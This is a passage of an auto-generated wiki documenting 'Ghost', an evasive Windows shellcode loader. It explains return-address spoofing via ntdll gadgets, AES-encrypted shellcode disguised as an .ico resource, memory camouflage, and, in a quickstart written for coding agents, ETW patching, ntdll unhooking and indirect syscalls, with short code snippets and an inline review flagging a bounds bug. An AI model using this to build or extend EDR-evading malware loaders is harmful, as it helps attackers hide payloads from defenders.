first argument.</li>
+<li><strong>The spoofed call.</strong> <code>CallFunction: jmp r10</code> jumps into the target. The target&#39;s own <code>ret</code> pops the <em>gadget</em> (planted at <code>[rsp]</code>) instead of a loader-frame return address, so the unwinder sees execution resume inside ntdll at a <code>call r12</code> gadget. The gadget&#39;s <code>call r12</code> then dispatches to <code>Fixup</code> (the handler already loaded in <code>r12</code>).</li>
+<li><strong>Fixup.</strong> <code>Fixup</code> restores the non-volatile registers from the saved scratch (<code>rsi</code>/<code>rdi</code>/<code>r12</code> at <code>[rsp+0x200+0x8/0x10/0x18]</code>), unwinds the two reserved frames (<code>add rsp, 0x300</code>), and <code>ret</code>s — returning to the actual caller of <code>RetSpoofCall</code> with the stack fully restored.</li>
+</ul>
+<p>The following sequence diagram shows the full round trip for a wrapped call:</p>
+<div class="mermaid pending">sequenceDiagram
+    participant Caller as Loader module
+    participant RSC as RetSpoofCall (retaddrspoof.asm)
+    participant Tgt as Target function
+    participant Gadget as ntdll call r12 (Gdgt)
+    participant Fixup as Fixup handler
+    Caller-&gt;&gt;RSC: RetSpoofCall(Function, nArgs, Gdgt, args...)
+    RSC-&gt;&gt;RSC: shift args down 3, save rsi/rdi/r12
+    RSC-&gt;&gt;RSC: plant Gdgt as return address (mov [rsp], r8)
+    RSC-&gt;&gt;Tgt: jmp r10 (target)
+    Tgt--&gt;&gt;Gadget: ret to planted Gdgt (call r12)
+    Gadget-&gt;&gt;Fixup: call r12 (r12 = Fixup)
+    Fixup-&gt;&gt;Caller: restore regs + frame, ret to original caller
+</div>
+<p><em>The target function&#39;s <code>ret</code> lands on the ntdll <code>call r12</code> gadget (Gdgt), not a loader frame, and the gadget forwards to Fixup, which restores the loader&#39;s own stack frame before returning to the true caller.</em></p>
+<h2>Why this defeats EDR unwinding</h2>
+<p>Without spoofing, an unwinder walking the thread stack after, say, <code>memcpy</code> returns would see the loader&#39;s frames (<code>main</code>, <code>AESDecrypt</code>, etc.) as the return addresses. With spoofing, the return address of every wrapped call points into ntdll at a <code>call r12</code> gadget, and the handler frames are the loader&#39;s own <code>RetSpoofCall</code>/<code>Fixup</code> internals, which contain no distinctive module/symbol that a signature would attribute to the loader. Because <code>Gdgt</code> is chosen randomly from up to 30 candidate gadget addresses, the exact return location varies, defeating naive &quot;return address equals ntdll+X&quot; heuristics.</p>
+<h2>Invariants and failure semantics</h2>
+<ul>
+<li><strong><code>Gdgt</code> must be resolved before any <code>RetSpoofCall</code> use.</strong> It is initialized as a global in <code>Ghost.cpp</code> before <code>main()</code> runs, so every module that <code>extern</code>s it already has a valid gadget. <code>FindROPGadget</code> prints an error and returns <code>NULL</code> if ntdll&#39;s <code>HMODULE</code> is <code>NULL</code> or a signature check fails; in that degenerate case the planted return address would be <code>NULL</code> and the spoofed call would crash on the return, which is why the signatures are validated ahead of time.</li>
+<li><strong>The gadget must be <code>call r12</code> and <code>r12</code> must equal <code>Fixup</code>.</strong> <code>FindROPGadget</code> scans only for <code>41 FF D4</code>, and the prologue loads <code>r12</code> with <code>Fixup</code> immediately before jumping into the target, so the gadget&#39;s <code>call r12</code> always transfers control to <code>Fixup</code>. Any change to the handler register or the gadget pattern must be mirrored on both sides.</li>
+<li><strong>Only executable ntdll sections are scanned.</strong> The <code>IMAGE_SCN_CNT_CODE</code> + <code>IMAGE_SCN_MEM_EXECUTE</code> filter guarantees the returned gadget address is in executable memory, so executing <code>call r12</code> there is valid.</li>
+<li><strong>Assembly is NASM-only.</strong> <code>retaddrspoof.asm</code> cannot be consumed by MASM; <code>build.py</code> must assemble it with <code>nasm</code> into <code>win64</code> object format, exactly like <code>syscalls.asm</code>.</li>
+<li><strong>The wrapper shifts exactly three slots.</strong> Every call to <code>RetSpoofCall</code> passes <code>(Function, nArgs, Gdgt, args...)</code> and the assembly shifts arguments down by three, so a caller that miscounts <code>nArgs</code> (or passes the wrong arity) would misalign stack arguments and corrupt the call. The header documents <code>nArgs</code> as the count of real target arguments, and the call sites throughout the project pass explicit counts (5 for read/protect, 2 for terminate, 11 for create-user-process) so the prologue lines the stack up correctly.</li>
+</ul>
+<h2>Related pages</h2>
+<ul>
+<li><a href="#page-2">loader-pipeline</a> — where the loader composes <code>RetSpoofCall</code> with the resource, decryption, and fiber stages.</li>
+<li><a href="#page-4">api-resolution-and-hashing</a> — how every wrapped function pointer and <code>hNT</code> are resolved before use.</li>
+<li><a href="#page-8">indirect-syscalls</a> — how <code>RetSpoofCall</code> rides on top of the <code>SysNt*</code> indirect syscall thunks.</li>
+<li><a href="#page-6">fiber-based-stack-hiding</a> — Ghost&#39;s second, larger-scale stack-hiding technique, which also relies on <code>RetSpoofCall</code> for <code>SwitchToFiber</code> calls.</li>
+</ul>
+</article><article class="wiki-page" id="page-11"><div class="page-label">PAGE 11 · concepts/shellcode-encryption-and-hiding.md</div><hr>
+<p>type: concept
+title: Shellcode Encryption &amp; Memory Hiding (AES.h, allocator.h, rsrc.h)
+description: How Ghost keeps its shellcode hidden from disk and memory scanning — pulling the AES-CBC-encrypted payload from an .ico RCDATA resource, decrypting it through the hash-resolved BCrypt API, and camouflaging the plaintext inside a large random-filled allocation (the Roshtyak technique).
+tags: [shellcode-hiding, aes-decryption, bcrypt, cbc, rcdata-resource, rosh tyak-camouflage, memory-scanning-evasion, rt lgenrandom, resource-extraction]
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-1d03e6e9af2ba4a79ba97ceb
+resource: repo://AES.h</li>
+<li>id: openwiki-source-7923dc349e377706a428462b
+resource: repo://allocator.h</li>
+<li>id: openwiki-source-e0fa2003814e1fa147c561c8
+resource: repo://build.py</li>
+<li>id: openwiki-source-dcba33204cd15ff156692bf1
+resource: repo://functions.h</li>
+<li>id: openwiki-source-fa04fdb0e1e359bf40e1bf73
+resource: repo://Ghost.cpp</li>
+<li>id: openwiki-source-41a9d90bce8783b40d1ac50c
+resource: repo://Resource.rc</li>
+<li>id: openwiki-source-623cbff6c7e51d628ceced79
+resource: repo://resource1.h</li>
+<li>id: openwiki-source-5cb3011b8d6f9c28cfbb8ee6
+resource: repo://rsrc.h
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>Shellcode Encryption &amp; Memory Hiding (AES.h, allocator.h, rsrc.h)</h1>
+<p>Ghost keeps its shellcode from ever being <em>observable</em> on disk or in memory by composing three mechanisms into one <code>main()</code> phase (see the <a href="#page-2">loader pipeline</a>):</p>
+<ol>
+<li><strong><code>rsrc.h</code> / <code>Resource.rc</code></strong> — retrieves the AES-encrypted shellcode from an embedded <code>RCDATA</code> resource that is disguised as an icon (<code>.ico</code>).</li>
+<li><strong><code>AES.h</code></strong> — decrypts that ciphertext back into plaintext shellcode using the Windows BCrypt API in CBC mode with a 32-byte key and 16-byte IV.</li>
+<li><strong><code>allocator.h</code></strong> — places the decrypted plaintext inside a very large, randomly-filled allocation at a random offset, so memory scanners do not see a contiguous, page-aligned shellcode blob (the <strong>Roshtyak</strong> technique).</li>
+</ol>
+<p>Every API involved — the resource functions, every BCrypt call, the memory allocator, and the <code>memcpy</code> — is resolved by hash at runtime (<code>functions.h</code>) and invoked through <code>RetSpoofCall</code> with the global <code>Gdgt</code> ROP gadget, so no import table entry and no loader frame exposes either the shellcode or the cryptographic operation. See <a href="#page-4">api-resolution-and-hashing</a> and <a href="#page-10">return-address-spoofing</a> for those shared mechanisms.</p>
+<h2>The build-time half: encrypting and embedding the payload</h2>
+<p>Before any of the runtime code runs, <code>build.py</code> produces the on-disk disguise:</p>
+<pre><code class="language-python">def aes_encrypt(data):
+    key = generate_random_key(32)  # 256 bits
+    iv = generate_random_key(16)   # 128 bits
+    ...
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
+    return encrypted_data, key, iv
+</code></pre>
+<ul>
+<li><code>prepare_src_shellcode()</code> → <code>do_aes(SHELLCODE)</code> reads the raw x64 shellcode binary, generates a <strong>fresh random 32-byte AES key and 16-byte IV per build</strong>, encrypts with <strong>AES-256-CBC</strong> (PKCS7 padding via <code>pad</code>), and writes the ciphertext to <strong><code>icon.ico</code></strong>.</li>
+<li>It then rewrites <code>Ghost.cpp</code> by regex-replacing the <code>unsigned char AesKey[] = {...};</code> and <code>unsigned char AesIv[] = {...};</code> arrays with the newly generated key/IV.</li>
+<li><code>build_resource()</code> compiles <code>Resource.rc</code>, which embeds <code>icon.ico</code> as the <code>IDR_RCDATA1</code> RCDATA resource, into <code>build/Resource.o</code>.</li>
+<li>The link step (<code>link()</code>) combines the resource object, the NASM objects, and <code>Ghost.o</code> into <code>Ghost.exe</code>.</li>
+</ul>
+<p>The result is that the only encrypted payload on disk rides inside a resource that Windows shows as an <code>.ico</code> icon, and the decryption key changes every build so old static signatures for the key never persist.</p>
+<div class="mermaid pending">flowchart TD
+    S[&quot;shellcode.bin (raw x64)&quot;] --&gt; E[&quot;build.py aes_encrypt: AES-256-CBC + random 32B key + 16B IV&quot;]
+    E --&gt; I[&quot;icon.ico (ciphertext)&quot;]
+    E --&gt; R[&quot;rewrite AesKey/AesIv arrays in Ghost.cpp&quot;]
+    I --&gt; RC[&quot;Resource.rc: IDR_RCDATA1 RCDATA icon.ico&quot;]
+    RC --&gt; RO[&quot;windres -&gt; Resource.o&quot;]
+    RO --&gt; EXE[&quot;link -&gt; Ghost.exe&quot;]
+    R --&gt; G[&quot;Ghost.cpp -&gt; Ghost.o&quot;]
+    G --&gt; EXE
+</div>
+<p><em>Build-time flow: the shellcode is AES-CBC-encrypted into an .ico file, the key/IV are injected into the C++ source, and the .ico is embedded as an RCDATA resource before linking.</em></p>
+<h2>Runtime step 1: GetFromRc — extracting the resource (rsrc.h)</h2>
+<p><code>GetFromRc(DWORD&amp; size, PVOID&amp; ptr)</code> in <code>rsrc.h</code> pulls the encrypted payload out of the embedded resource using the classic Windows resource API, with every call hash-resolved and ret-spoofed:</p>
+<ol>
+<li><code>FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA)</code> — locates the resource by ID <code>IDR_RCDATA1</code> (defined as <code>101</code> in <code>resource1.h</code>) of type <code>RT_RCDATA</code>.</li>
+<li><code>LoadResource(NULL, hResource)</code> — loads it into global memory.</li>
+<li><code>LockResource(hGlobal)</code> — returns a pointer to the loaded resource bytes.</li>
+<li><code>SizeofResource(NULL, hResource)</code> — returns its byte size.</li>
+</ol>
+<p>All four are resolved in <code>functions.h</code> from <code>kernelbase.dll</code> via hash (<code>e_FindResourceW</code>, <code>e_LoadResource</code>, <code>e_LockResource</code>, <code>e_SizeofResource</code>) and each passed through <code>RetSpoofCall((void*)e_..., Gdgt, ...)</code>. The function writes the resource base into <code>ptr</code> and its size into <code>size</code>, returning <code>0</code> on success (it stops and prints a failure line if any step returns <code>NULL</code>, though it does not hard-abort).</p>
+<p><code>IDR_RCDATA1 RCDATA &quot;icon.ico&quot;</code> in <code>Resource.rc</code> is what makes <code>FindResourceW(..., RT_RCDATA)</code> find the icon file&#39;s bytes at runtime — the encrypted shellcode is thus buried in what appears to be an icon resource.</p>
+<p><code>main()</code> then copies those bytes into a heap buffer (<code>AesCipherText</code>) with a ret-spoofed <code>memcpy</code> and feeds them to the decryptor.</p>
+<h2>Runtime step 2: AESDecrypt — the BCrypt decryption flow (AES.h)</h2>
+<p><code>AESDecrypt</code> (the public wrapper) validates its inputs, fills an <code>AES</code> struct with the key, IV, ciphertext, and ciphertext size, and calls <code>InternalAESDecrypt</code>.</p>
+<p><code>InternalAESDecrypt</code> runs the full BCrypt symmetric-decryption sequence against <code>bcrypt.dll</code>, where every call is hash-resolved (<code>e_BCrypt*</code> in <code>functions.h</code>) and wrapped in <code>RetSpoofCall</code>:</p>
+<ol>
+<li><code>BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0)</code> — opens an AES algorithm handle.</li>
+<li><code>BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, ...)</code> — queries <code>cbKeyObject</code> (the key-object buffer size) and <code>BCRYPT_BLOCK_LENGTH</code> (block size).</li>
+<li>It validates the block size equals 16 and allocates the key object on the heap with <code>malloc</code> + <code>RtlSecureZeroMemory</code>.</li>
+<li><code>BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, ...)</code> — switches the algorithm to CBC chaining mode.</li>
+<li><code>BCryptGenerateSymmetricKey(hAlgorithm, &amp;hKeyHandle, pbKeyObject, cbKeyObject, KEY, KEYSIZE)</code> — builds the key object from the 32-byte key (<code>KEYSIZE = 32</code>).</li>
+<li><strong>Two-pass <code>BCryptDecrypt</code></strong>: the first call passes <code>NULL/null</code> output pointers with <code>BCRYPT_BLOCK_PADDING</code> to learn the decrypted size (<code>cbPlainText</code>); the second allocates a heap buffer and decrypts the ciphertext in place with the 16-byte IV (<code>IVSIZE = 16</code>), returning the plaintext.</li>
+</ol>
+<p>On success the plaintext pointer and size are written back into the <code>AES</code> struct, and <code>AESDecrypt</code> returns them through its <code>pPlaintTextData</code> / <code>pPlaintTextSize</code> out-parameters. Cleanup (<code>_CLEANUP</code>) destroys the key (<code>BCryptDestroyKey</code>), closes the algorithm (<code>BCryptCloseAlgorithmProvider</code>), and frees the key object; the plaintext buffer is only attached to the struct when the operation succeeded.</p>
+<p>The throughput of this phase in <code>main()</code>:</p>
+<pre><code class="language-c">decryption = AESDecrypt(AesCipherText, ResourceSize, AesKey, AesIv, &amp;pPlainBuffer, &amp;PlainBufferSize);
+if (!decryption) { std::cout &lt;&lt; &quot;[+] Decryption UnSuccessful&quot; &lt;&lt; std::endl; return -1; }
+</code></pre>
+<p>So a failed decryption aborts the loader before any allocation or payload execution.</p>
+<h2>Runtime step 3: allocate_large_page / place_data_rand — Roshtyak hiding (allocator.h)</h2>
+<p><code>allocate_large_page(SIZE_T cbPageSize)</code> creates a camouflage region large enough that the real payload is only a tiny fraction of it:</p>
+<ul>
+<li><code>pCtx-&gt;uSize = ALIGN_PAGE(cbPageSize * FACTOR)</code> with <code>FACTOR = 2048</code> and <code>ALIGN_PAGE(n) = ((n + 0x1000) &amp; ~(0x1000))</code> — the region is <code>2048×</code> the plaintext size, rounded up to a page.</li>
+<li>It sets <code>lpPage = nullptr</code> (explicitly, because the NT API requires a <code>NULL</code> base pointer for allocation), then calls <code>NtAllocateVirtualMemory</code> (ret-spoofed, <code>SELF_HANDLE</code>) with <code>MEM_COMMIT | MEM_RESERVE</code> and <code>PAGE_READWRITE</code>.</li>
+<li>It fills the whole region with cryptographic random noise via <code>SystemFunction036</code> (i.e. <code>RtlGenRandom</code>).</li>
+<li>It picks a <strong>random byte offset</strong> <code>dwOffset = RANDOM_NUMB(0, uSize)</code> and computes <code>lpData = (BYTE*)lpPage + dwOffset</code> — the random slot where the payload will live.</li>
+<li>The result is returned in a <code>LARGE_PAGE_INFORMATION</code> context; on allocation failure it returns <code>NULL</code> (via <code>NTAPI_VALIDATE_RETURN2NULL</code>).</li>
+</ul>
+<p class="flagged-warning"><code>place_data_rand(pCtx, pbBuffer, cbBuffer)</code> then copies the decrypted plaintext into that random slot with a ret-spoofed <code>memcpy</code>. Because the payload is buried among tens or hundreds of megabytes of <code>RtlGenRandom</code> bytes at a non-page-aligned, random offset, a naive memory scan for a contiguous shellcode signature finds nothing, and the allocation itself looks like ordinary random data.</p><aside class="inline-issue issue-orange" id="ghost-openwiki-bounds" data-issue>
+      <div class="issue-label">关键风险遗漏 · P1</div><h3>准确描述了随机放置，却没有指出可能越界</h3>
+      <div class="issue-five">
+        <div><b>原 Wiki 怎么说</b><p>Wiki 写明从整块内存随机选位置，再复制完整载荷，并把这解释为隐藏效果。</p></div>
+        <div><b>源码实际是什么</b><p>源码没有保证“随机起点 + 载荷长度”仍在内存范围内。</p></div>
+        <div><b>普通人怎么理解</b><p>箱子藏得随机不等于放得安全；靠近货架末端时仍会伸出去。</p></div>
+        <div><b>为什么影响判断</b><p>读者会把有缺陷的实现当成可复用设计。</p></div>
+        <div><b>建议怎么改</b><p>在该段后直接标出边界缺陷，不只描述它想达到的效果。</p></div>
+      </div>
+      <details><summary>查看该仓库快照中的源码证据</summary><p><a href="https://github.com/cpu0x00/Ghost/blob/bf67313c72d1df48117daf4aeca604e83a570280/allocator.h#L35-L72">allocator.h：随机起点和完整复制 ↗</a></p></details>
+    </aside>
+<p>In <code>main()</code>, once the payload is placed, the now-unneeded ciphertext copy and plaintext heap buffer are immediately freed:</p>
+<pre><code class="language-c">pLPI = allocate_large_page(PlainBufferSize);
+place_data_rand(pLPI, (PBYTE)pPlainBuffer, PlainBufferSize);
+free(AesCipherText);
+delete[] pPlainBuffer;
+</code></pre>
+<p>so the sole remaining copy of the shellcode lives only inside the camouflaged random allocation. Later the pipeline makes the whole large page executable (<code>PAGE_EXECUTE_READ</code>) and runs the payload fiber from <code>pLPI-&gt;lpData</code>, but that is the responsibility of the <a href="#page-2">loader pipeline</a> and <a href="#page-6">fiber-based-stack-hiding</a>, not this page.</p>
+<h2>Composition and data flow</h2>
+<!-- openwiki: mermaid parse failed and this diagram was converted to a text fence so it does not break rendering. Fix the diagram source and restore the mermaid fence. Parser error: Parse error on line 14: ...elete[] pPlainBuffer Expecting '()', 'SOLID_OPEN_ARROW', 'DOTTED_OPEN_ARROW', 'SOLID_ARROW', 'SOLID_ARROW_TOP', 'SOLID_ARROW_BOTTOM', 'STICK_ARROW_TOP', 'STICK_ARROW_BOTTOM', 'SOLID_ARROW_TOP_DOTTED', 'SOLID_ARROW_BOTTOM_DOTTED', 'STICK_ARROW_TOP_DOTTED', 'STICK_ARROW_BOTTOM_DOTTED', 'SOLID_ARROW_TOP_REVERSE', 'SOLID_ARROW_BOTTOM_REVERSE', 'STICK_ARROW_TOP_REVERSE', 'STI -->
+<pre><code class="language-text">sequenceDiagram
+    participant M as main (Ghost.cpp)
+    participant R as rsrc.h GetFromRc
+    participant A as AES.h AESDecrypt
+    participant AL as allocator.h
+    M-&gt;&gt;R: GetFromRc(ResourceSize, ptr)
+    R--&gt;&gt;M: ptr = RCDATA bytes (ciphertext), size
+    M-&gt;&gt;M: memcpy -&gt; AesCipherText (heap)
+    M-&gt;&gt;A: AESDecrypt(AesCipherText, ..., AesKey, AesIv)
+    A--&gt;&gt;M: pPlainBuffer + PlainBufferSize
+    M-&gt;&gt;AL: allocate_large_page(PlainBufferSize)
+    AL--&gt;&gt;M: pLPI (large random page, random offset)
+    M-&gt;&gt;AL: place_data_rand(pLPI, plaintext, size)
+    M-&gt;&gt;M: free(AesCipherText); delete[] pPlainBuffer
+</code></pre>
+<p><em>Runtime composition: resource extraction feeds the BCrypt decryptor, whose plaintext is camouflaged into a large random allocation — after which the transient ciphertext and plaintext buffers are freed.</em></p>
+<h2>Key data structures</h2>
+<ul>
+<li><strong><code>AES</code></strong> (in <code>AES.h</code>): carries <code>pPlainText</code>/<code>plainTextSize</code> (output) and <code>pCipherText</code>/<code>CipherSize</code> (input), plus the <code>KEY</code> (32 bytes) and <code>IV</code> (16 bytes). <code>KEYSIZE</code> and <code>IVSIZE</code> are fixed at 32 and 16.</li>
+<li><strong><code>LARGE_PAGE_INFORMATION</code></strong> (in <code>allocator.h</code>): records the random <code>dwOffset</code>, the region <code>uSize</code>, the base <code>lpPage</code>, and <code>lpData</code> (the actual payload location).</li>
+</ul>
+<h2>Configuration &amp; operational notes</h2>
+<ul>
+<li><strong>Key/IV are per-build.</strong> <code>AesKey</code>/<code>AesIv</code> are hardcoded arrays in <code>Ghost.cpp</code> but <code>build.py</code> regenerates them every build, so they are not static credentials.</li>
+<li><strong>The resource is an <code>.ico</code>.</strong> <code>Resource.rc</code> declares <code>IDR_RCDATA1 RCDATA &quot;icon.ico&quot;</code>, and <code>build.py</code> writes the <em>encrypted shellcode</em> into <code>icon.ico</code>; the loader treats it as <code>RT_RCDATA</code> at runtime, so the on-disk artifact presents as an icon while actually carrying ciphertext.</li>
+<li><strong>Hash-resolved + ret-spoofed throughout.</strong> None of the resource, BCrypt, allocator, or <code>memcpy</code> calls appear as link-time imports; all resolve through <code>GetFunctionAddressH</code> and execute through <code>RetSpoofCall</code> with <code>Gdgt</code>. This composes the disk hiding with the runtime stack-hiding and API-resolution mechanisms in the rest of the project.</li>
+<li><strong>Failure semantics:</strong> <code>AESDecrypt</code> returns <code>FALSE</code> on any invalid input or failed BCrypt step, and <code>main()</code> aborts (<code>return -1</code>); <code>allocate_large_page</code> returns <code>NULL</code> if the allocation fails. The decrypted data only becomes the payload fiber entry point later in the pipeline, so a failure here stops the loader before execution.</li>
+</ul>
+<h2>Relationships</h2>
+<ul>
+<li><a href="#page-2">loader-pipeline</a> — the three mechanisms are one phase of <code>main()</code>&#39;s startup sequence.</li>
+<li><a href="#page-4">api-resolution-and-hashing</a> — every API here is resolved at runtime via <code>functions.h</code> / <code>resolvers.h</code> instead of being imported.</li>
+<li><a href="#page-10">return-address-spoofing</a> — every call in these three modules runs through <code>RetSpoofCall</code> with the shared <code>Gdgt</code>.</li>
+<li><a href="#page-6">fiber-based-stack-hiding</a> — what happens to the hidden payload after it is made executable and run as a fiber.</li>
+</ul>
+</article><article class="wiki-page" id="page-12"><div class="page-label">PAGE 12 · index.md</div><hr>
+<h2>okf_version: &quot;0.2&quot;</h2>
+<h1>Files</h1>
+<ul>
+<li><a href="#page-13">Ghost Loader Wiki Quickstart</a> - Entry point that orients a coding agent to the Ghost repository — an evasive Windows shellcode loader written in C++ and NASM — covering what Ghost is, the high-level execution pipeline, how to navigate the wiki hierarchy, and where each major evasion mechanism is documented.</li>
+</ul>
+<h1>Directories</h1>
+<ul>
+<li><a href="https://github.com/cpu0x00/Ghost/blob/bf67313c72d1df48117daf4aeca604e83a570280/openwiki/architecture">architecture</a></li>
+<li><a href="https://github.com/cpu0x00/Ghost/blob/bf67313c72d1df48117daf4aeca604e83a570280/openwiki/concepts">concepts</a></li>
+<li><a href="https://github.com/cpu0x00/Ghost/blob/bf67313c72d1df48117daf4aeca604e83a570280/openwiki/workflows">workflows</a></li>
+</ul>
+</article><article class="wiki-page" id="page-13"><div class="page-label">PAGE 13 · quickstart.md</div><hr>
+<p>type: reference
+title: Ghost Loader Wiki Quickstart
+description: Entry point that orients a coding agent to the Ghost repository — an evasive Windows shellcode loader written in C++ and NASM — covering what Ghost is, the high-level execution pipeline, how to navigate the wiki hierarchy, and where each major evasion mechanism is documented.
+tags: [quickstart, overview, navigation, shellcode-loader, evasion]
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-8037e2358a2c4f9b2c722a11
+resource: repo://AGENTS.md</li>
+<li>id: openwiki-source-e0fa2003814e1fa147c561c8
+resource: repo://build.py</li>
+<li>id: openwiki-source-dcba33204cd15ff156692bf1
+resource: repo://functions.h</li>
+<li>id: openwiki-source-fa04fdb0e1e359bf40e1bf73
+resource: repo://Ghost.cpp</li>
+<li>id: openwiki-source-96fc8fb8f4406029a00adfc5
+resource: repo://hash.h</li>
+<li>id: openwiki-source-c959c853f7e9085f6114cb2f
+resource: repo://hook.h</li>
+<li>id: openwiki-source-23775c3de52f3ab95a13cb8b
+resource: repo://README.md</li>
+<li>id: openwiki-source-8194cb6085876618fe7c465b
+resource: repo://resolvers.h
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>Ghost Loader Wiki Quickstart</h1>
+<p>Ghost is a <strong>standalone, evasive Windows shellcode loader</strong> written in C++ with NASM assembly. It loads an AES-encrypted x64 shellcode payload and executes it while evading the detection techniques a typical EDR uses: kernel callbacks, stack unwinding, memory scanning, API hooking, and ETW. It is <strong>not a library</strong> — it is a complete program that starts from <code>main()</code> in <code>Ghost.cpp</code> and never returns.</p>
+<p>The main entrypoint is <code>Ghost.cpp</code>. Its <code>main()</code> calls nearly every evasion mechanism in sequence: it unhooks ntdll, patches ETW, decrypts and hides the payload, then runs the payload on a fiber while the loader thread performs an invisible kernel-safe sleep loop.</p>
+<h2>A compact mental model</h2>
+<div class="mermaid pending">flowchart TD
+    G[&quot;Ghost.cpp main&quot;] --&gt; H[&quot;unhook ntdll&quot;]
+    G --&gt; E[&quot;patch ETW&quot;]
+    G --&gt; D[&quot;decrypt AES payload from resource&quot;]
+    D --&gt; C[&quot;camouflage payload in large random allocation&quot;]
+    C --&gt; F[&quot;set up fiber pair + Sleep hook&quot;]
+    F --&gt; P[&quot;run payload on fiber&quot;]
+    P --&gt; S[&quot;Sleep hook switches to loader fiber&quot;]
+    S --&gt; W[&quot;invisible event-based delay&quot;]
+    W --&gt; P
+</div>
+<p><em>High-level pipeline: every operation revolves around <code>main()</code> in <code>Ghost.cpp</code>, which composes unhooking, ETW patching, shellcode decryption/hiding, and the fiber-based sleep loop shown in detail on the <a href="#page-2">loader pipeline</a> page.</em></p>
+<p>Three cross-cutting mechanisms make this architecture readable:</p>
+<ul>
+<li><strong><code>RetSpoofCall</code></strong> — the variadic assembly wrapper (in <code>retaddrspoof.asm</code>) that every module uses to hide call stacks. Nearly every API, NT call, and indirect syscall in the project is invoked through it, along with the shared <code>Gdgt</code> ROP gadget pointer.</li>
+<li><strong><code>Gdgt</code></strong> — a randomly chosen <code>call r12</code> ROP gadget from ntdll, declared once in <code>Ghost.cpp</code> and shared across all modules so every spoofed call returns through a legitimate ntdll gadget.</li>
+<li><strong><code>functions.h</code> + <code>resolvers.h</code></strong> — the runtime API resolution layer. Functions are not imported at link time; they are resolved by walking the PEB and parsing the PE export table with a custom hash, so there is no import table for an EDR to inspect.</li>
+</ul>
+<h2>How to navigate the wiki</h2>
+<p>The wiki is organized into three directories that map cleanly onto how you read the code:</p>
+<ul>
+<li><strong><code>/openwiki/architecture/</code></strong> — end-to-end flows and shared foundations. Start with the <a href="#page-2">loader pipeline</a> for the canonical order of operations, then read <a href="#page-3">shared types, structures &amp; constants</a> for the type definitions, NT structs, and macros everything depends on.</li>
+<li><strong><code>/openwiki/concepts/</code></strong> — the individual evasion mechanisms, each documented on its own page because they are independently testable techniques. These are the building blocks the pipeline composes.</li>
+<li><strong><code>/openwiki/workflows/</code></strong> — build and operational procedures. See <a href="#page-14">build &amp; deployment</a> for how the binary is produced.</li>
+</ul>
+<h2>Task-routing map</h2>
+<p>Depending on what you are changing or investigating, land on the specific page that owns that mechanism:</p>
+<table>
+<thead>
+<tr>
+<th>If you are working on…</th>
+<th>Go to</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>The overall start-to-finish execution order, how the evasion steps compose, and the fiber sleep loop</td>
+<td><a href="#page-2">Loader Pipeline (End-to-End Execution Flow)</a></td>
+</tr>
+<tr>
+<td>Custom PE structures, NT structures, function-typedefs, <code>PS_ATTRIBUTE</code> macros, and error-handling macros</td>
+<td><a href="#page-3">Shared Types, Structures &amp; Constants</a></td>
+</tr>
+<tr>
+<td>Resolving APIs without an import table, PEB walking, export table parsing, <code>WEIRDHASHA</code>, and SSN resolution</td>
+<td><a href="#page-4">API Resolution &amp; Custom Hashing</a></td>
+</tr>
+<tr>
+<td>Disabling ETW by patching <code>NtTraceEvent</code> / <code>NtTraceControl</code> with an early <code>ret</code></td>
+<td><a href="#page-5">ETW Patching</a></td>
+</tr>
+<tr>
+<td>Hiding the payload&#39;s call stack during sleep via the <code>Sleep</code> hook and fiber switching</td>
+<td><a href="#page-6">Fiber-Based Stack Hiding</a></td>
+</tr>
+<tr>
+<td>The <code>SysNt*</code> indirect syscall stubs and how they use dynamically resolved SSNs</td>
+<td><a href="#page-8">Indirect Syscalls &amp; SSN Resolution</a></td>
+</tr>
+<tr>
+<td>Flushing EDR hooks from ntdll via a suspended <code>audiodg.exe</code> process</td>
+<td><a href="#page-9">NTDLL Unhooking via Suspended Process</a></td>
+</tr>
+<tr>
+<td>The <code>RetSpoofCall</code> variadic wrapper and ROP-gadget return-address spoofing</td>
+<td><a href="#page-10">Return Address Spoofing</a></td>
+</tr>
+<tr>
+<td>AES-CBC decryption via BCrypt, Roshtyak memory camouflage, and resource retrieval</td>
+<td><a href="#page-11">Shellcode Encryption &amp; Memory Hiding</a></td>
+</tr>
+<tr>
+<td>Cross-compiling a raw shellcode <code>.bin</code> into <code>Ghost.exe</code> on Linux</td>
+<td><a href="#page-14">Build &amp; Deployment Workflow</a></td>
+</tr>
+</tbody></table>
+<h2>Invariants that affect every change</h2>
+<ul>
+<li><strong>There are no automated tests.</strong> Validation is via compilation with the MinGW cross-compiler toolchain (running on Linux) plus NASM for the assembly stubs. <code>build.py</code> drives the whole thing and is the only supported build path.</li>
+<li><strong>The loader never imports functions at link time.</strong> Expect hashed dynamic resolution (<code>functions.h</code>) rather than SDK <code>#include</code>s in the runtime modules.</li>
+<li><strong><code>RetSpoofCall</code> is the universal call wrapper.</strong> When you add a call to any sensitive API or syscall, route it through <code>RetSpoofCall(Function, nArgs, Gdgt, ...)</code> so the call stack stays hidden.</li>
+<li><strong><code>Ghost.cpp</code> is the composition point.</strong> Individual mechanisms live in their headers (<code>unhook.h</code>, <code>etw.h</code>, <code>hook.h</code>, <code>allocator.h</code>, <code>AES.h</code>, <code>rsrc.h</code>), but the order and wiring happen in <code>main()</code>.</li>
+</ul>
+<h2>Where to go next</h2>
+<ul>
+<li>To understand the whole execution flow in order, read the <a href="#page-2">loader pipeline</a>.</li>
+<li>To understand how the binary is produced from raw shellcode, read the <a href="#page-14">build workflow</a>.</li>
